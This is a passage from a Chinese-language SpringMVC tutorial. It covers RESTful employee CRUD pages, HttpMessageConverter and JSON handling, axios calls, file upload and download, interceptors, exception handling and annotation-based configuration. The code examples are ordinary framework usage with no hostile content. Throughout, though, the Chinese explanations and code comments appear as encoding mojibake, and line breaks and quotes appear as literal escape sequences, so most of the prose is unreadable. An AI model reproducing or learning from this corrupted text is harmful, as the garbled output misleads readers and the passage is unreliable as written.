//é€šè¿‡idè·å–è¡¨å•æ ‡ç­¾\n                var delete_form = document.getElementById(\"delete_form\");\n                //å°†è§¦å‘äº‹ä»¶çš„è¶…é“¾æ¥çš„hrefå±æ€§ä¸ºè¡¨å•çš„actionå±æ€§èµ‹å€¼\n                delete_form.action = event.target.href;\n                //æäº¤è¡¨å•\n                delete_form.submit();\n                //é˜»æ­¢è¶…é“¾æ¥çš„é»˜è®¤è·³è½¬è¡Œä¸º\n                event.preventDefault();\n            }\n        }\n    });\n</script>\n```\n\nå®Œæ•´é¡µé¢ä»£ç \n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Employee Info</title>\n</head>\n<body>\n\n    <table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"text-align: center;\" id=\"dataTable\">\n        <tr>\n            <th colspan=\"5\">Employee Info</th>\n        </tr>\n        <tr>\n            <th>id</th>\n            <th>lastName</th>\n            <th>email</th>\n            <th>gender</th>\n            <th>options</th>\n        </tr>\n        <tr th:each=\"employee : ${employeeList}\">\n            <td th:text=\"${employee.id}\"></td>\n            <td th:text=\"${employee.lastName}\"></td>\n            <td th:text=\"${employee.email}\"></td>\n            <td th:text=\"${employee.gender}\"></td>\n            <td>\n                <a @click=\"deleteEmployee\" th:href=\"@{'/employee/'+${employee.id}}\">delete</a>\n            </td>\n        </tr>\n    </table>\n<!-- ä½œç”¨ï¼šé€šè¿‡è¶…é“¾æ¥æ§åˆ¶è¡¨å•çš„æäº¤ï¼Œå°†postè¯·æ±‚è½¬æ¢ä¸ºdeleteè¯·æ±‚ -->\n<form id=\"delete_form\" method=\"post\">\n  <input type=\"hidden\" name=\"_method\" value=\"delete\"/>\n</form>\n  \n<!--å¼•å…¥vue.js-->\n<script type=\"text/javascript\" th:src=\"@{/static/js/vue.js}\"></script>\n<script type=\"text/javascript\">\n    var vue = new Vue({\n        el:\"#dataTable\",\n        methods:{\n            //eventè¡¨ç¤ºå½“å‰äº‹ä»¶\n            deleteEmployee:function (event) {\n                //é€šè¿‡idè·å–è¡¨å•æ ‡ç­¾\n                var delete_form = document.getElementById(\"delete_form\");\n                //å°†è§¦å‘äº‹ä»¶çš„è¶…é“¾æ¥çš„hrefå±æ€§ä¸ºè¡¨å•çš„actionå±æ€§èµ‹å€¼\n                delete_form.action = event.target.href;\n                //æäº¤è¡¨å•\n                delete_form.submit();\n                //é˜»æ­¢è¶…é“¾æ¥çš„é»˜è®¤è·³è½¬è¡Œä¸º\n                event.preventDefault();\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n- 4>æ§åˆ¶å™¨æ–¹æ³•\n\n```java\n@RequestMapping(value = \"/employee/{id}\", method = RequestMethod.DELETE)\npublic String deleteEmployee(@PathVariable(\"id\") Integer id){\n    employeeDao.delete(id);\n    return \"redirect:/employee\";\n}\n```\n\n5>ç›¸å…³é…ç½®\n\nspringMVC.xmlé…ç½®\n\n```xml\n<!--å¼€æ”¾é™æ€èµ„æºçš„è®¿é—®ï¼Œä¸ºäº†è®¿é—®vue.js-->\n<mvc:default-servlet-handler/>\n```\n\nweb.xmlé…ç½®\n\n```xml\n<!--HiddenHttpMethodFilterå¤„ç†putå’Œdeleteè¯·æ±‚çš„æ¡ä»¶-->\n    <filter>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n\n#### 6ã€åŠŸèƒ½4ï¼šè·³è½¬åˆ°æ·»åŠ æ•°æ®é¡µé¢\n\n- 1>å‘˜å·¥ä¿¡æ¯é¡µé¢æ·»åŠ å¢åŠ æ“ä½œçš„è¶…é“¾æ¥\n\n```html\n<th>options(<a th:href=\"@{/toAdd}\">add</a>)</th>\n```\n\n- 2>é…ç½®view-controller\n\n```xml\n<mvc:view-controller path=\"/toAdd\" view-name=\"employee_add\"></mvc:view-controller>\n```\n\n- 2>åˆ›å»ºemployee_add.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Add Employee</title>\n</head>\n<body>\n\n<form th:action=\"@{/employee}\" method=\"post\">\n    lastName:<input type=\"text\" name=\"lastName\"><br>\n    email:<input type=\"text\" name=\"email\"><br>\n    gender:\n    <input type=\"radio\" name=\"gender\" value=\"1\">male\n    <input type=\"radio\" name=\"gender\" value=\"0\">female<br>\n    <input type=\"submit\" value=\"add\"><br>\n</form>\n\n</body>\n</html>\n```\n\n#### 7ã€åŠŸèƒ½5ï¼šä¿å­˜æ•°æ®\n\n- æ§åˆ¶å™¨æ–¹æ³•\n\n```java\n@RequestMapping(value = \"/employee\", method = RequestMethod.POST)\npublic String addEmployee(Employee employee){\n    employeeDao.save(employee);\n    return \"redirect:/employee\";\n}\n```\n\n#### 8ã€åŠŸèƒ½6ï¼šè·³è½¬åˆ°æ›´æ–°æ•°æ®é¡µé¢\n\n- 1>å‘˜å·¥ä¿¡æ¯é¡µé¢æ·»åŠ æ›´æ–°æ“ä½œçš„è¶…é“¾æ¥\n\n```html\n<a th:href=\"@{'/employee/'+${employee.id}}\">update</a>\n```\n\n- 2>æ§åˆ¶å™¨æ–¹æ³•ï¼šè·³è½¬åˆ°æ›´æ–°æ•°æ®é¡µé¢ï¼Œå¹¶ä¿å­˜æ›´æ–°çš„æ•°æ®åˆ°åŸŸä¸­\n\n```java\n@RequestMapping(value = \"/employee/{id}\", method = RequestMethod.GET)\npublic String getEmployeeById(@PathVariable(\"id\") Integer id, Model model){\n    Employee employee = employeeDao.get(id);\n    model.addAttribute(\"employee\", employee);\n    return \"employee_update\";\n}\n```\n\n- 3>åˆ›å»ºemployee_update.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Update Employee</title>\n</head>\n<body>\n\n<form th:action=\"@{/employee}\" method=\"post\">\n    <input type=\"hidden\" name=\"_method\" value=\"put\">\n    <input type=\"hidden\" name=\"id\" th:value=\"${employee.id}\">\n    lastName:<input type=\"text\" name=\"lastName\" th:value=\"${employee.lastName}\"><br>\n    email:<input type=\"text\" name=\"email\" th:value=\"${employee.email}\"><br>\n    <!--\n        th:field=\"${employee.gender}\"å¯ç”¨äºå•é€‰æ¡†æˆ–å¤é€‰æ¡†çš„å›æ˜¾\n        è‹¥å•é€‰æ¡†çš„valueå’Œemployee.genderçš„å€¼ä¸€è‡´ï¼Œåˆ™æ·»åŠ checked=\"checked\"å±æ€§\n    -->\n    gender:<input type=\"radio\" name=\"gender\" value=\"1\" th:field=\"${employee.gender}\">male\n    <input type=\"radio\" name=\"gender\" value=\"0\" th:field=\"${employee.gender}\">female<br>\n    <input type=\"submit\" value=\"update\"><br>\n</form>\n\n</body>\n</html>\n```\n\n#### 9ã€åŠŸèƒ½7ï¼šæ›´æ–°æ•°æ®\n\n- æ§åˆ¶å™¨æ–¹æ³•\n\n```java\n@RequestMapping(value = \"/employee\", method = RequestMethod.PUT)\npublic String updateEmployee(Employee employee){\n    employeeDao.save(employee);\n    return \"redirect:/employee\";\n}\n```\n\n## å…«ã€HttpMessageConverter\n\nHttpMessageConverterï¼ŒæŠ¥æ–‡ä¿¡æ¯è½¬æ¢å™¨ï¼Œå°†è¯·æ±‚æŠ¥æ–‡è½¬æ¢ä¸ºJavaå¯¹è±¡ï¼Œæˆ–å°†Javaå¯¹è±¡è½¬æ¢ä¸ºå“åº”æŠ¥æ–‡\n\nHttpMessageConverter æä¾›äº†ä¸¤ä¸ªæ³¨è§£å’Œä¸¤ä¸ªç±»å‹ï¼š\n\n- @RequestBodyï¼Œ@ResponseBody\n- RequestEntityï¼ŒResponseEntity\n\n### 1ã€@RequestBody\n\nä¸»è¦ç”¨æ¥æ¥æ”¶**å‰ç«¯ä¼ é€’ç»™åç«¯çš„jsonå­—ç¬¦ä¸²ä¸­çš„æ•°æ®çš„**(è¯·æ±‚ä½“ä¸­çš„æ•°æ®çš„)\n\n@RequestBodyå¯ä»¥**è·å–è¯·æ±‚ä½“**ï¼Œéœ€è¦åœ¨æ§åˆ¶å™¨æ–¹æ³•è®¾ç½®ä¸€ä¸ªå½¢å‚ï¼Œä½¿ç”¨@RequestBodyè¿›è¡Œæ ‡è¯†ï¼Œå½“å‰è¯·æ±‚çš„è¯·æ±‚ä½“å°±ä¼šä¸ºå½“å‰æ³¨è§£æ‰€æ ‡è¯†çš„å½¢å‚èµ‹å€¼\n\n```html\n<form th:action=\"@{/testRequestBody}\" method=\"post\">\n    ç”¨æˆ·åï¼š<input type=\"text\" name=\"username\"><br>\n    å¯†ç ï¼š<input type=\"password\" name=\"password\"><br>\n    <input type=\"submit\">\n</form>\n```\n\n```java\n@RequestMapping(\"/testRequestBody\")\npublic String testRequestBody(@RequestBody String requestBody){\n    System.out.println(\"requestBody:\"+requestBody);\n    return \"success\";\n}\n```\n\nè¾“å‡ºç»“æœï¼šrequestBody:username=admin&password=123456\n\n### 2ã€RequestEntity\n\nRequestEntity**å°è£…è¯·æ±‚æŠ¥æ–‡**çš„ä¸€ç§ç±»å‹ï¼Œéœ€è¦åœ¨æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ä¸­è®¾ç½®è¯¥ç±»å‹çš„å½¢å‚ï¼Œå½“å‰è¯·æ±‚çš„è¯·æ±‚æŠ¥æ–‡å°±ä¼šèµ‹å€¼ç»™è¯¥å½¢å‚ï¼Œå¯ä»¥é€šè¿‡getHeaders()è·å–è¯·æ±‚å¤´ä¿¡æ¯ï¼Œé€šè¿‡getBody()è·å–è¯·æ±‚ä½“ä¿¡æ¯\n\n```java\n@RequestMapping(\"/testRequestEntity\")\npublic String testRequestEntity(RequestEntity<String> requestEntity){\n    System.out.println(\"requestHeader:\"+requestEntity.getHeaders());\n    System.out.println(\"requestBody:\"+requestEntity.getBody());\n    return \"success\";\n}\n```\n\nè¾“å‡ºç»“æœï¼š\nrequestHeader:[host:\"localhost:8080\", connection:\"keep-alive\", content-length:\"27\", cache-control:\"max-age=0\", sec-ch-ua:\"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"\", sec-ch-ua-mobile:\"?0\", upgrade-insecure-requests:\"1\", origin:\"http://localhost:8080\", user-agent:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\"]\nrequestBody:username=admin&password=123\n\n### 3ã€@ResponseBody\n\n@ResponseBodyç”¨äºæ ‡è¯†ä¸€ä¸ªæ§åˆ¶å™¨æ–¹æ³•ï¼Œå¯ä»¥å°†è¯¥æ–¹æ³•çš„è¿”å›å€¼ç›´æ¥ä½œä¸ºå“åº”æŠ¥æ–‡çš„å“åº”ä½“å“åº”åˆ°æµè§ˆå™¨\n\n```java\n@RequestMapping(\"/testResponseBody\")\n@ResponseBody\npublic String testResponseBody(){\n    return \"hello\";\n}\n```\n\nç»“æœï¼šæµè§ˆå™¨é¡µé¢æ˜¾ç¤ºhello\n\n### 4ã€SpringMVCå¤„ç†json\n\n@ResponseBodyå¤„ç†jsonçš„æ­¥éª¤ï¼š\n\n- a>å¯¼å…¥jacksonçš„ä¾èµ–\n\n```xml\n<dependency>\n    <groupId>com.fasterxml.jackson.core</groupId>\n    <artifactId>jackson-databind</artifactId>\n    <version>2.12.1</version>\n</dependency>\n```\n\n- b>åœ¨SpringMVCçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ä¸­å¼€å¯mvcçš„æ³¨è§£é©±åŠ¨ï¼Œæ­¤æ—¶åœ¨HandlerAdaptorä¸­ä¼šè‡ªåŠ¨è£…é…ä¸€ä¸ªæ¶ˆæ¯è½¬æ¢å™¨ï¼šMappingJackson2HttpMessageConverterï¼Œå¯ä»¥å°†å“åº”åˆ°æµè§ˆå™¨çš„Javaå¯¹è±¡è½¬æ¢ä¸ºJsonæ ¼å¼çš„å­—ç¬¦ä¸²\n\n```xml\n<mvc:annotation-driven />\n```\n\n- c>åœ¨å¤„ç†å™¨æ–¹æ³•ä¸Šä½¿ç”¨@ResponseBodyæ³¨è§£è¿›è¡Œæ ‡è¯†\n\n- d>å°†Javaå¯¹è±¡ç›´æ¥ä½œä¸ºæ§åˆ¶å™¨æ–¹æ³•çš„è¿”å›å€¼ï¼Œå°±ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºJsonæ ¼å¼çš„å­—ç¬¦ä¸²\n\n```java\n@RequestMapping(\"/testResponseUser\")\n@ResponseBody\npublic User testResponseUser(){\n    return new User(1001,\"admin\",\"123456\",23,\"ç”·\");\n}\n```\n\næµè§ˆå™¨çš„é¡µé¢ä¸­å±•ç¤ºçš„ç»“æœï¼š\n\n{\"id\":1001,\"username\":\"admin\",\"password\":\"123456\",\"age\":23,\"sex\":\"ç”·\"}\n\n### 5ã€SpringMVCå¤„ç†axios\n\na>è¯·æ±‚è¶…é“¾æ¥ï¼š\n\n```html\n<div id=\"app\">\n\t<a th:href=\"@{/testAxios}\" @click=\"testAxios\">testAxios</a><br>\n</div>\n```\n\nb>é€šè¿‡vueå’Œaxioså¤„ç†ç‚¹å‡»äº‹ä»¶ï¼š\n\n```html\n<script type=\"text/javascript\" th:src=\"@{/static/js/vue.js}\"></script>\n<script type=\"text/javascript\" th:src=\"@{/static/js/axios.js}\"></script>\n<script type=\"text/javascript\">\n    var vue = new Vue({\n        el:\"#app\",\n        methods:{\n            testAxios:function (event) {\n                axios({\n                    method:\"post\",\n                    url:event.target.href,\n                    params:{\n                        username:\"admin\",\n                        password:\"123456\"\n                    }\n                }).then(function (response) {\n                    alert(response.data);\n                });\n                event.preventDefault();//é˜»æ­¢è¶…é“¾æ¥çš„é»˜è®¤è·³è½¬è¡Œä¸º\n            }\n        }\n    });\n</script>\n```\n\nc>æ§åˆ¶å™¨æ–¹æ³•ï¼š\n\n```java\n@RequestMapping(\"/testAxios\")\n@ResponseBody\npublic String testAxios(String username, String password){\n    System.out.println(\"username:\"+username+\",password:\"+password);\n    return \"hello,Axios\";\n}\n```\n\n### 6ã€@RestController\n\n@RestControlleræ³¨è§£æ˜¯springMVCæä¾›çš„ä¸€ä¸ªå¤åˆæ³¨è§£ï¼Œæ ‡è¯†åœ¨**æ§åˆ¶å™¨çš„ç±»**ä¸Š\n\nç›¸å½“äºä¸º**ç±»**æ·»åŠ äº†`@Controller`æ³¨è§£ï¼Œå¹¶ä¸”ä¸ºå…¶ä¸­çš„æ¯ä¸ª**æ–¹æ³•**æ·»åŠ äº†`@ResponseBody`æ³¨è§£\n\n### 7ã€ResponseEntity\n\nResponseEntityç”¨äºæ§åˆ¶å™¨æ–¹æ³•çš„è¿”å›å€¼ç±»å‹ï¼Œè¯¥æ§åˆ¶å™¨æ–¹æ³•çš„è¿”å›å€¼å°±æ˜¯å“åº”åˆ°æµè§ˆå™¨çš„å“åº”æŠ¥æ–‡\n\nResponseEntityå¯ä»¥ç”¨æ¥å®ç°æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ï¼Œå…·ä½“å®ç°è¯·çœ‹ä¸‹ä¸€ç« ã€‚\n\n## ä¹ã€æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½\n\n### 1ã€æ–‡ä»¶ä¸‹è½½\n\nä½¿ç”¨ResponseEntityå®ç°ä¸‹è½½æ–‡ä»¶çš„åŠŸèƒ½\n\n- a>ä¸‹è½½æ–‡ä»¶è¶…é“¾æ¥\n\n```html\n<a th:href=\"@{/testDown}\">ä¸‹è½½æ–‡ä»¶</a>\n```\n\n- b>æ§åˆ¶å™¨æ–¹æ³•\n\n```java\n@RequestMapping(\"/testDown\")\npublic ResponseEntity<byte[]> testResponseEntity(HttpSession session) throws IOException {\n    //è·å–ServletContextå¯¹è±¡\n    ServletContext servletContext = session.getServletContext();\n    //è·å–æœåŠ¡å™¨ä¸­æ–‡ä»¶çš„çœŸå®è·¯å¾„\n    String realPath = servletContext.getRealPath(\"/static/img/1.jpg\");\n    //åˆ›å»ºè¾“å…¥æµ\n    InputStream is = new FileInputStream(realPath);\n    //åˆ›å»ºå­—èŠ‚æ•°ç»„\n    byte[] bytes = new byte[is.available()];\n    //å°†æµè¯»åˆ°å­—èŠ‚æ•°ç»„ä¸­\n    is.read(bytes);\n    //åˆ›å»ºHttpHeaderså¯¹è±¡è®¾ç½®å“åº”å¤´ä¿¡æ¯\n    MultiValueMap<String, String> headers = new HttpHeaders();\n    //è®¾ç½®è¦ä¸‹è½½æ–¹å¼ä»¥åŠä¸‹è½½åæ–‡ä»¶çš„åå­—\n    headers.add(\"Content-Disposition\", \"attachment;filename=1.jpg\");\n    //è®¾ç½®å“åº”çŠ¶æ€ç \n    HttpStatus statusCode = HttpStatus.OK;\n    //åˆ›å»ºResponseEntityå¯¹è±¡\n    ResponseEntity<byte[]> responseEntity = new ResponseEntity<>(bytes, headers, statusCode);\n    //å…³é—­è¾“å…¥æµ\n    is.close();\n    return responseEntity;\n}\n```\n\n### 2ã€æ–‡ä»¶ä¸Šä¼ \n\næ–‡ä»¶ä¸Šä¼ è¦æ±‚formè¡¨å•çš„è¯·æ±‚æ–¹å¼å¿…é¡»ä¸ºpostï¼Œå¹¶ä¸”æ·»åŠ å±æ€§`enctype=\"multipart/form-data\"`\n\nSpringMVCä¸­å°†ä¸Šä¼ çš„æ–‡ä»¶å°è£…åˆ°MultipartFileå¯¹è±¡ä¸­ï¼Œé€šè¿‡æ­¤å¯¹è±¡å¯ä»¥è·å–æ–‡ä»¶ç›¸å…³ä¿¡æ¯ï¼Œä¸Šä¼ æ­¥éª¤ï¼š\n\n- a>æ·»åŠ ä¾èµ–ï¼š\n\n```xml\n<!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload -->\n<dependency>\n    <groupId>commons-fileupload</groupId>\n    <artifactId>commons-fileupload</artifactId>\n    <version>1.3.1</version>\n</dependency>\n```\n\nb>åœ¨SpringMVCçš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ é…ç½®ï¼š\n\n```xml\n<!--å¿…é¡»é€šè¿‡æ–‡ä»¶è§£æå™¨çš„è§£ææ‰èƒ½å°†æ–‡ä»¶è½¬æ¢ä¸ºMultipartFileå¯¹è±¡-->\n<bean id=\"multipartResolver\" class=\"org.springframework.web.multipart.commons.CommonsMultipartResolver\"></bean>\n```\n\n- c>ä¸Šä¼ è§†å›¾\n\n```html\n<form th:action=\"@{/testUp}\" method=\"post\" enctype=\"multipart/form-data\">\n  é€‰æ‹©ä¸Šä¼ æ–‡ä»¶ï¼š<input type=\"file\" name=\"photo\"><br>\n  <input type=\"submit\">\n</form>\n```\n\n- d>æ§åˆ¶å™¨æ–¹æ³•ï¼š\n\n```java\n@RequestMapping(\"/testUp\")\npublic String testUp(MultipartFile photo, HttpSession session) throws IOException {\n    //è·å–ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶å\n    String fileName = photo.getOriginalFilename();\n    //å¤„ç†æ–‡ä»¶é‡åé—®é¢˜\n    String hzName = fileName.substring(fileName.lastIndexOf(\".\"));\n    fileName = UUID.randomUUID().toString() + hzName;\n    //è·å–æœåŠ¡å™¨ä¸­photoç›®å½•çš„è·¯å¾„\n    ServletContext servletContext = session.getServletContext();\n    String photoPath = servletContext.getRealPath(\"photo\");\n    File file = new File(photoPath);\n    if(!file.exists()){\n        file.mkdir();\n    }\n    String finalPath = photoPath + File.separator + fileName;\n    //å®ç°ä¸Šä¼ åŠŸèƒ½\n    photo.transferTo(new File(finalPath));\n    return \"success\";\n}\n```\n\n## åã€æ‹¦æˆªå™¨\n\n### 1ã€æ‹¦æˆªå™¨çš„é…ç½®\n\n- SpringMVCä¸­çš„æ‹¦æˆªå™¨ç”¨äº**æ‹¦æˆªæ§åˆ¶å™¨æ–¹æ³•çš„æ‰§è¡Œ**\n\n- SpringMVCä¸­çš„æ‹¦æˆªå™¨éœ€è¦å®ç°**HandlerInterceptor**\n\nSpringMVCçš„æ‹¦æˆªå™¨å¿…é¡»åœ¨SpringMVCçš„é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®ï¼š\n\n```xml\n<bean class=\"com.example.interceptor.FirstInterceptor\"></bean>\n<ref bean=\"firstInterceptor\"></ref>\n<!-- ä»¥ä¸Šä¸¤ç§é…ç½®æ–¹å¼éƒ½æ˜¯å¯¹DispatcherServletæ‰€å¤„ç†çš„æ‰€æœ‰çš„è¯·æ±‚è¿›è¡Œæ‹¦æˆª -->\n<mvc:interceptor>\n    <mvc:mapping path=\"/**\"/>\n    <mvc:exclude-mapping path=\"/testRequestEntity\"/>\n    <ref bean=\"firstInterceptor\"></ref>\n</mvc:interceptor>\n<!-- \n\tä»¥ä¸Šé…ç½®æ–¹å¼å¯ä»¥é€šè¿‡refæˆ–beanæ ‡ç­¾è®¾ç½®æ‹¦æˆªå™¨ï¼Œé€šè¿‡mvc:mappingè®¾ç½®éœ€è¦æ‹¦æˆªçš„è¯·æ±‚ï¼Œé€šè¿‡mvc:exclude-mappingè®¾ç½®éœ€è¦æ’é™¤çš„è¯·æ±‚ï¼Œå³ä¸éœ€è¦æ‹¦æˆªçš„è¯·æ±‚\n-->\n```\n\n### 2ã€æ‹¦æˆªå™¨çš„ä¸‰ä¸ªæŠ½è±¡æ–¹æ³•\n\nSpringMVCä¸­çš„æ‹¦æˆªå™¨æœ‰ä¸‰ä¸ªæŠ½è±¡æ–¹æ³•ï¼š\n\n- preHandleï¼šæ§åˆ¶å™¨æ–¹æ³•æ‰§è¡Œä¹‹å‰æ‰§è¡ŒpreHandle()ï¼Œ\n  - booleanç±»å‹çš„è¿”å›å€¼è¡¨ç¤ºæ˜¯å¦æ‹¦æˆªæˆ–æ”¾è¡Œï¼Œè¿”å›trueä¸ºæ”¾è¡Œï¼Œå³è°ƒç”¨æ§åˆ¶å™¨æ–¹æ³•ï¼›\n  - è¿”å›falseè¡¨ç¤ºæ‹¦æˆªï¼Œå³ä¸è°ƒç”¨æ§åˆ¶å™¨æ–¹æ³•\n\n- postHandleï¼šæ§åˆ¶å™¨æ–¹æ³•æ‰§è¡Œä¹‹åæ‰§è¡ŒpostHandle()\n\n- afterComplationï¼šæ¸²æŸ“è§†å›¾å®Œæ¯•ä¹‹åæ‰§è¡ŒafterComplation()ï¼Œå¤„ç†å®Œè§†å›¾å’Œæ¨¡å‹æ•°æ®\n\n### 3ã€å¤šä¸ªæ‹¦æˆªå™¨çš„æ‰§è¡Œé¡ºåº\n\n- a>è‹¥æ¯ä¸ªæ‹¦æˆªå™¨çš„preHandle()éƒ½è¿”å›true\n\n  -  æ­¤æ—¶å¤šä¸ªæ‹¦æˆªå™¨çš„æ‰§è¡Œé¡ºåºå’Œæ‹¦æˆªå™¨åœ¨SpringMVCçš„é…ç½®æ–‡ä»¶çš„é…ç½®é¡ºåºæœ‰å…³ï¼š\n\n  - preHandle()ä¼šæŒ‰ç…§é…ç½®çš„é¡ºåºæ‰§è¡Œ\n  - postHandle()å’ŒafterComplation()ä¼šæŒ‰ç…§é…ç½®çš„ååºæ‰§è¡Œ\n\n- b>è‹¥æŸä¸ªæ‹¦æˆªå™¨çš„preHandle()è¿”å›äº†false\n  - preHandle()è¿”å›falseå’Œå®ƒä¹‹å‰çš„æ‹¦æˆªå™¨çš„preHandle()éƒ½ä¼šæ‰§è¡Œï¼ŒpostHandle()éƒ½ä¸æ‰§è¡Œï¼Œè¿”å›falseçš„æ‹¦æˆªå™¨ä¹‹å‰çš„æ‹¦æˆªå™¨çš„afterComplation()ä¼šæ‰§è¡Œ\n\n## åä¸€ã€å¼‚å¸¸å¤„ç†å™¨\n\n### 1ã€åŸºäºé…ç½®çš„å¼‚å¸¸å¤„ç†\n\nSpringMVCæä¾›äº†ä¸€ä¸ªå¤„ç†æ§åˆ¶å™¨æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­æ‰€å‡ºç°çš„å¼‚å¸¸çš„æ¥å£ï¼šHandlerExceptionResolver\n\nHandlerExceptionResolveræ¥å£çš„å®ç°ç±»æœ‰ï¼šDefaultHandlerExceptionResolverå’ŒSimpleMappingExceptionResolver\n\nSpringMVCæä¾›äº†è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†å™¨SimpleMappingExceptionResolverï¼Œä½¿ç”¨æ–¹å¼ï¼š\n\n```xml\n<!--é…ç½®å¼‚å¸¸å¤„ç†-->\n<bean class=\"org.springframework.web.servlet.handler.SimpleMappingExceptionResolver\">\n    <property name=\"exceptionMappings\">\n        <props>\n        \t<!--\n        \t\tpropertiesçš„é”®è¡¨ç¤ºå¤„ç†å™¨æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç°çš„å¼‚å¸¸\n        \t\tpropertiesçš„å€¼è¡¨ç¤ºè‹¥å‡ºç°æŒ‡å®šå¼‚å¸¸æ—¶ï¼Œè®¾ç½®ä¸€ä¸ªæ–°çš„è§†å›¾åç§°ï¼Œè·³è½¬åˆ°æŒ‡å®šé¡µé¢\n        \t-->\n            <prop key=\"java.lang.ArithmeticException\">error</prop>\n        </props>\n    </property>\n    <!--\n    \texceptionAttributeå±æ€§è®¾ç½®ä¸€ä¸ªå±æ€§åï¼Œå°†å‡ºç°çš„å¼‚å¸¸ä¿¡æ¯åœ¨è¯·æ±‚åŸŸä¸­è¿›è¡Œå…±äº«\n    -->\n    <property name=\"exceptionAttribute\" value=\"ex\"></property>\n</bean>\n```\n\n**æµ‹è¯•**\n\nç‚¹å‡»è¶…é“¾æ¥ï¼Œæ‰§è¡Œæ§åˆ¶å™¨æ–¹æ³•ï¼Œå‡ºç°æ•°å­¦è¿ç®—é”™è¯¯ï¼Œè·³è½¬åˆ°erroré¡µé¢ï¼Œå¹¶ä¸”è¿”å›é”™è¯¯ä¿¡æ¯\n\n```java\n//è·³è½¬è¶…é“¾æ¥\n<a th:href=\"@{/testExceptionHandler}\">æµ‹è¯•å¼‚å¸¸å¤„ç†</a>\n\n//æ§åˆ¶å™¨æ–¹æ³•  \n@RequestMapping(\"/testExceptionHandler\")\npublic String testExceptionHandler(){\n    System.out.println(1/0);\n    return \"success\";\n}\n```\n\nerror.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\nå‡ºç°é”™è¯¯\n<p th:text=\"${ex}\"></p><!--è¿”å›é”™è¯¯ä¿¡æ¯-->\n</body>\n</html>\n```\n\nè¿”å›ç»“æœ\n\n```\nå‡ºç°é”™è¯¯\njava.lang.ArithmeticException: / by zero\n```\n\n### 2ã€åŸºäºæ³¨è§£çš„å¼‚å¸¸å¤„ç†\n\n```java\n@ControllerAdvice //@ControllerAdviceå°†å½“å‰ç±»æ ‡è¯†ä¸ºå¼‚å¸¸å¤„ç†çš„ç»„ä»¶\npublic class ExceptionController {\n    //@ExceptionHandlerç”¨äºè®¾ç½®å¤„ç†çš„å¼‚å¸¸\n    @ExceptionHandler(ArithmeticException.class)\n    //exè¡¨ç¤ºå½“å‰è¯·æ±‚å¤„ç†ä¸­å‡ºç°çš„å¼‚å¸¸å¯¹è±¡\n    public String handleArithmeticException(Exception ex, Model model){\n        model.addAttribute(\"ex\", ex);\n        return \"error\";\n    }\n}\n```\n\nè¯¥æ–¹æ³•å®ç°æ•ˆæœä¸åŸºäºé…ç½®çš„å¼‚å¸¸å¤„ç†æ•ˆæœä¸€æ ·\n\n## åäºŒã€æ³¨è§£é…ç½®SpringMVC\n\n> ä½¿ç”¨é…ç½®ç±»å’Œæ³¨è§£ä»£æ›¿web.xmlå’ŒSpringMVCé…ç½®æ–‡ä»¶çš„åŠŸèƒ½\n\n### 1ã€åˆ›å»ºåˆå§‹åŒ–ç±»ï¼Œä»£æ›¿web.xml\n\n- åœ¨Servlet3.0ç¯å¢ƒä¸­ï¼Œå®¹å™¨ä¼šåœ¨ç±»è·¯å¾„ä¸­æŸ¥æ‰¾å®ç°javax.servlet.ServletContainerInitializeræ¥å£çš„ç±»ï¼Œå¦‚æœæ‰¾åˆ°çš„è¯å°±ç”¨å®ƒæ¥é…ç½®Servletå®¹å™¨ã€‚\n- Springæä¾›äº†è¿™ä¸ªæ¥å£çš„å®ç°ï¼Œåä¸ºSpringServletContainerInitializerï¼Œè¿™ä¸ªç±»åè¿‡æ¥åˆä¼šæŸ¥æ‰¾å®ç°WebApplicationInitializerçš„ç±»å¹¶å°†é…ç½®çš„ä»»åŠ¡äº¤ç»™å®ƒä»¬æ¥å®Œæˆã€‚\n- Spring3.2å¼•å…¥äº†ä¸€ä¸ªä¾¿åˆ©çš„WebApplicationInitializeråŸºç¡€å®ç°ï¼Œåä¸ºAbstractAnnotationConfigDispatcherServletInitializerï¼Œå½“æˆ‘ä»¬çš„ç±»æ‰©å±•äº†AbstractAnnotationConfigDispatcherServletInitializerå¹¶å°†å…¶éƒ¨ç½²åˆ°Servlet3.0å®¹å™¨çš„æ—¶å€™ï¼Œå®¹å™¨ä¼šè‡ªåŠ¨å‘ç°å®ƒï¼Œå¹¶ç”¨å®ƒæ¥é…ç½®Servletä¸Šä¸‹æ–‡ã€‚\n\n```java\npublic class WebInit extends AbstractAnnotationConfigDispatcherServletInitializer {\n\n    /**\n     * æŒ‡å®šspringçš„é…ç½®ç±»\n     * @return\n     */\n    @Override\n    protected Class<?>[] getRootConfigClasses() {\n        return new Class[]{SpringConfig.class};\n    }\n\n    